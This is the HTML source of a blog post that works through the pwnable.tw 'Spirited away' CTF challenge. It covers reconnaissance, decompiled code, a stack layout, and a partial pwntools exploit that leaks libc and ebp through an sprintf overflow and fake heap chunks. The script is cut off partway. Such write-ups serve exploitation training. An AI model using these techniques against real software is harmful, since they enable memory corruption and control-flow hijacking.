@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Spirited away (300 pts) - pwnable.tw | NguyenDD&#39;s Blog</title>
+<meta name="keywords" content="pwnable.tw">
+<meta name="description" content="
+ 0x1. Initial Reconnaissance 
+file
+↪ file spirited_away
+spirited_away: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=9e6cd4dbfea6557127f3e9a8d90e2fe46b21f842, not stripped
+checksec
+↪ checksec --file=spirited_away
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
+Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   80 Symbols	  No	0		4		spirited_away
+./spirited_away
+↪ ./spirited_away
+Thanks for watching Spirited Away!
+Please leave some comments to help us improve our next movie!
+
+Please enter your name: ndd
+Please enter your age: 18&#39;
+Why did you came to see this movie? bored
+Please enter your comment: bullshit
+Name: ndd
+
+Age: 18
+Reason: bored
+
+&gt;��@M��
+       &gt;��!&#39;��@M���&amp;��=
+Comment: bullshit
+
+
+1 comment so far. We will review them as soon as we can
+
+Would you like to leave another comment? &lt;y/n&gt;:
+
+0x2. Reverse Engineering
+survey
+int survey()
+{
+  char v1[56]; // [esp&#43;10h] [ebp-E8h] BYREF
+  int v2; // [esp&#43;48h] [ebp-B0h]
+  int v3; // [esp&#43;4Ch] [ebp-ACh]
+  char v4[80]; // [esp&#43;50h] [ebp-A8h] BYREF
+  int v5; // [esp&#43;A0h] [ebp-58h] BYREF
+  const char *v6; // [esp&#43;A4h] [ebp-54h]
+  char v7[80]; // [esp&#43;A8h] [ebp-50h] BYREF
+
+  v2 = 60;
+  v3 = 80;
+LABEL_2:
+  memset(v4, 0, sizeof(v4));
+  v6 = (const char *)malloc(60);
+  printf(&#34;\nPlease enter your name: &#34;);
+  fflush(stdout);
+  read(0, v6, v2);
+  printf(&#34;Please enter your age: &#34;);
+  fflush(stdout);
+  __isoc99_scanf(&#34;%d&#34;, &amp;v5);
+  printf(&#34;Why did you came to see this movie? &#34;);
+  fflush(stdout);
+  read(0, v7, v3);
+  fflush(stdout);
+  printf(&#34;Please enter your comment: &#34;);
+  fflush(stdout);
+  read(0, v4, v2);
+  &#43;&#43;cnt;
+  printf(&#34;Name: %s\n&#34;, v6);
+  printf(&#34;Age: %d\n&#34;, v5);
+  printf(&#34;Reason: %s\n&#34;, v7);
+  printf(&#34;Comment: %s\n\n&#34;, v4);
+  fflush(stdout);
+  sprintf(v1, &#34;%d comment so far. We will review them as soon as we can&#34;, cnt);
+  puts(v1);
+  puts(&amp;unk_8048A81);
+  fflush(stdout);
+  if ( cnt &gt; 199 )
+  {
+    puts(&#34;200 comments is enough!&#34;);
+    fflush(stdout);
+    exit(0);
+  }
+  while ( 1 )
+  {
+    printf(&#34;Would you like to leave another comment? &lt;y/n&gt;: &#34;);
+    fflush(stdout);
+    read(0, &amp;choice, 3);
+    if ( choice == 89 || choice == 121 )
+    {
+      free(v6);
+      goto LABEL_2;
+    }
+    if ( choice == 78 || choice == 110 )
+      break;
+    puts(&#34;Wrong choice.&#34;);
+    fflush(stdout);
+  }
+  puts(&#34;Bye!&#34;);
+  return fflush(stdout);
+}
+
+0x3. Analysis
+This challenge allows us to write our name with v2 bytes to a chunk of 60 bytes (the address of the chunk stored at v6), an integer to v5, v3 bytes to v7[80] and v2 bytes to v4[80]. Copy &quot;%d comment so far. We will review them as soon as we can&quot; to v1[56]. And their sequence on stack will be like that:">
+<meta name="author" content="">
+<link rel="canonical" href="//localhost:1313/blogs/spirited_away/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css" integrity="sha256-j&#43;ECM6cGvIfy4Is8&#43;XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as="style">
+<link rel="icon" href="//localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="//localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="//localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="//localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="//localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="//localhost:1313/blogs/spirited_away/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="//localhost:1313/" accesskey="h" title="NguyenDD&#39;s Blog (Alt + H)">NguyenDD&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="//localhost:1313/blogs" title="Blogs">
+                    <span>Blogs</span>
+                </a>
+            </li>
+            <li>
+                <a href="//localhost:1313/tags" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Spirited away (300 pts) - pwnable.tw
+    </h1>
+    <div class="post-meta"><span title='2025-08-29 12:52:53 +0700 +07'>August 29, 2025</span>
+
+</div>
+  </header> 
+  <div class="post-content"><hr>
+<h2 id="0x1-initial-reconnaissance"><!-- raw HTML omitted --> 0x1. Initial Reconnaissance <!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#0x1-initial-reconnaissance">#</a></h2>
+<h3 id="file">file<a hidden class="anchor" aria-hidden="true" href="#file">#</a></h3>
+<pre tabindex="0"><code>↪ file spirited_away
+spirited_away: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=9e6cd4dbfea6557127f3e9a8d90e2fe46b21f842, not stripped
+</code></pre><h3 id="checksec">checksec<a hidden class="anchor" aria-hidden="true" href="#checksec">#</a></h3>
+<pre tabindex="0"><code>↪ checksec --file=spirited_away
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
+Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   80 Symbols	  No	0		4		spirited_away
+</code></pre><h3 id="spirited_away">./spirited_away<a hidden class="anchor" aria-hidden="true" href="#spirited_away">#</a></h3>
+<pre tabindex="0"><code>↪ ./spirited_away
+Thanks for watching Spirited Away!
+Please leave some comments to help us improve our next movie!
+
+Please enter your name: ndd
+Please enter your age: 18&#39;
+Why did you came to see this movie? bored
+Please enter your comment: bullshit
+Name: ndd
+
+Age: 18
+Reason: bored
+
+&gt;��@M��
+       &gt;��!&#39;��@M���&amp;��=
+Comment: bullshit
+
+
+1 comment so far. We will review them as soon as we can
+
+Would you like to leave another comment? &lt;y/n&gt;:
+</code></pre><hr>
+<h2 id="0x2-reverse-engineering"><!-- raw HTML omitted -->0x2. Reverse Engineering<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#0x2-reverse-engineering">#</a></h2>
+<h3 id="survey">survey<a hidden class="anchor" aria-hidden="true" href="#survey">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">survey</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> v1[<span style="color:#ae81ff">56</span>]; <span style="color:#75715e">// [esp+10h] [ebp-E8h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v2; <span style="color:#75715e">// [esp+48h] [ebp-B0h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// [esp+4Ch] [ebp-ACh]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v4[<span style="color:#ae81ff">80</span>]; <span style="color:#75715e">// [esp+50h] [ebp-A8h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v5; <span style="color:#75715e">// [esp+A0h] [ebp-58h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v6; <span style="color:#75715e">// [esp+A4h] [ebp-54h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v7[<span style="color:#ae81ff">80</span>]; <span style="color:#75715e">// [esp+A8h] [ebp-50h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  v2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">60</span>;
+</span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">80</span>;
+</span></span><span style="display:flex;"><span>LABEL_2:
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(v4, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(v4));
+</span></span><span style="display:flex;"><span>  v6 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">60</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Please enter your name: &#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fflush</span>(stdout);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, v6, v2);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Please enter your age: &#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fflush</span>(stdout);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>v5);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Why did you came to see this movie? &#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fflush</span>(stdout);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, v7, v3);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fflush</span>(stdout);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Please enter your comment: &#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fflush</span>(stdout);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, v4, v2);
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">++</span>cnt;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Name: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, v6);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Age: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, v5);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Reason: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, v7);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Comment: %s</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>, v4);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fflush</span>(stdout);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sprintf</span>(v1, <span style="color:#e6db74">&#34;%d comment so far. We will review them as soon as we can&#34;</span>, cnt);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(v1);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#f92672">&amp;</span>unk_8048A81);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fflush</span>(stdout);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( cnt <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">199</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;200 comments is enough!&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fflush</span>(stdout);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Would you like to leave another comment? &lt;y/n&gt;: &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fflush</span>(stdout);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>choice, <span style="color:#ae81ff">3</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( choice <span style="color:#f92672">==</span> <span style="color:#ae81ff">89</span> <span style="color:#f92672">||</span> choice <span style="color:#f92672">==</span> <span style="color:#ae81ff">121</span> )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">free</span>(v6);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">goto</span> LABEL_2;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( choice <span style="color:#f92672">==</span> <span style="color:#ae81ff">78</span> <span style="color:#f92672">||</span> choice <span style="color:#f92672">==</span> <span style="color:#ae81ff">110</span> )
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Wrong choice.&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fflush</span>(stdout);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Bye!&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">fflush</span>(stdout);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><hr>
+<h2 id="0x3-analysis"><!-- raw HTML omitted -->0x3. Analysis<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#0x3-analysis">#</a></h2>
+<p>This challenge allows us to write our name with <code>v2</code> bytes to a chunk of 60 bytes (the address of the chunk stored at <code>v6</code>), an integer to <code>v5</code>, <code>v3</code> bytes to <code>v7[80]</code> and <code>v2</code> bytes to <code>v4[80]</code>. Copy <code>&quot;%d comment so far. We will review them as soon as we can&quot;</code> to <code>v1[56]</code>. And their sequence on stack will be like that:</p>
+<pre tabindex="0"><code>ebp - 0xe8 -&gt; v1[0]
++4         -&gt; v1[1]
+...
++52        -&gt; v1[55]
+ebp - 0xb0 -&gt; v2 (Size of name and comment)
++4         -&gt; v3 (Size of reason)
+ebp - 0xa8 -&gt; v4[0] (comment)
++4         -&gt; v4[1]
+...
++76        -&gt; v4[79]
+ebp - 0x58 -&gt; v5 (age)
++4         -&gt; v6 (pointer of name)
+ebp - 0x50 -&gt; v7[0] (reason)
++4         -&gt; v7[1]
+...
++76        -&gt; v7[79]
+ebp        -&gt; ... 
+</code></pre><hr>
+<h2 id="0x3-exploit"><!-- raw HTML omitted -->0x3. Exploit<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#0x3-exploit">#</a></h2>
+<p>In this challenge you can easily get the leak of libc on the stack, because they print <code>comment, reason, name</code> with <code>%s</code> format.</p>
+<p>They copy the sequence to <code>v1[56]</code> using <code>sprintf</code>, and if the <code>cnt</code> integer has 3 numbers, the consequence will have 57 bytes, thus overwriting <code>v2</code> to &rsquo;n&rsquo; which is 0x6e. As a result, we can overwrite pointer of the chunk (<code>v6</code>) to a fake chunk. Create a fake chunk at <code>v7[80]</code>, and then create a new comment, now you can write 0x6e bytes to <code>v7[80]</code>, which is right above the ebp, overwriting eip :DD.</p>
+<p>Notice that, <code>sprintf</code> will add a null byte to the end of sequence, so if <code>cnt</code> integer has 2 numbers, <code>v2</code> will be overwritten to 0 and we can&rsquo;t no longer input name and comment.</p>
+<p>Another noticeable thing is that <code>libc 2.23</code> doesn&rsquo;t have tcache. They will check whether the chunk is adjacent to the top chunk or not before freeing it, if not they will check the size of the next chunk. Thus build 2 fake chunks to bypass !!!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (__builtin_expect (chunk_at_offset (p, size)<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> SIZE_SZ, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">||</span> __builtin_expect (chunksize (chunk_at_offset (p, size))
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&gt;=</span> av<span style="color:#f92672">-&gt;</span>system_mem, <span style="color:#ae81ff">0</span>))
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (have_lock
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">||</span> ({ <span style="color:#66d9ef">assert</span> (locked <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>        mutex_lock(<span style="color:#f92672">&amp;</span>av<span style="color:#f92672">-&gt;</span>mutex);
+</span></span><span style="display:flex;"><span>        locked <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>        chunk_at_offset (p, size)<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> SIZE_SZ
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">||</span> chunksize (chunk_at_offset (p, size)) <span style="color:#f92672">&gt;=</span> av<span style="color:#f92672">-&gt;</span>system_mem;
+</span></span><span style="display:flex;"><span>        }))
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>    errstr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;free(): invalid next size (fast)&#34;</span>;
+</span></span><span style="display:flex;"><span>    goto errout;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#960050;background-color:#1e0010">!</span> have_lock)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        (void)mutex_unlock(<span style="color:#f92672">&amp;</span>av<span style="color:#f92672">-&gt;</span>mutex);
+</span></span><span style="display:flex;"><span>        locked <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h5 id="exploit">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./spirited_away_patched&#34;</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc_32.so.6&#34;</span>)
+</span></span><span style="display:flex;"><span>ld <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./ld-2.23.so&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;debug&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">conn</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> process([exe<span style="color:#f92672">.</span>path])
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># r = gdb.debug ([exe.path], &#34;b *survey&#34;)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;chall.pwnable.tw&#34;</span>, <span style="color:#ae81ff">10204</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">Input</span> (p, name, age, reason, comment):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendafter (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;name: &#39;</span>, name)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;age: &#39;</span>, age)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendafter (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;movie? &#39;</span>, reason)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendafter (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;comment: &#39;</span>, comment)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">Input_after_10</span> (p, age, reason):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;age: &#39;</span>, age)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendafter (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;movie? &#39;</span>, reason)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> conn()
+</span></span><span style="display:flex;"><span>    Input (p, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;ndd&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;12&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">9</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;bullshit&#39;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>)
+</span></span><span style="display:flex;"><span>    leak <span style="color:#f92672">=</span> u32 (p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4</span>))
+</span></span><span style="display:flex;"><span>    libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1e2041</span>
+</span></span><span style="display:flex;"><span>    print (<span style="color:#e6db74">&#34;The leak is: &#34;</span>, hex (leak))
+</span></span><span style="display:flex;"><span>    print (<span style="color:#e6db74">&#34;the address of libc is: &#34;</span>, hex (libc<span style="color:#f92672">.</span>address))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&lt;y/n&gt;: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;y&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Input (p, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;ndd&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;12&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">56</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;yyyyyy&#39;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">56</span>)
+</span></span><span style="display:flex;"><span>    leak <span style="color:#f92672">=</span> u32 (p<span style="color:#f92672">.</span>recv (<span style="color:#ae81ff">4</span>))
+</span></span><span style="display:flex;"><span>    ebp <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x20</span>
+</span></span><span style="display:flex;"><span>    print (<span style="color:#e6db74">&#34;The leak is : &#34;</span>, hex (leak))
+</span></span><span style="display:flex;"><span>    print (<span style="color:#e6db74">&#34;The ebp is : &#34;</span>, hex (ebp))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    cnt <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range (<span style="color:#ae81ff">98</span>):
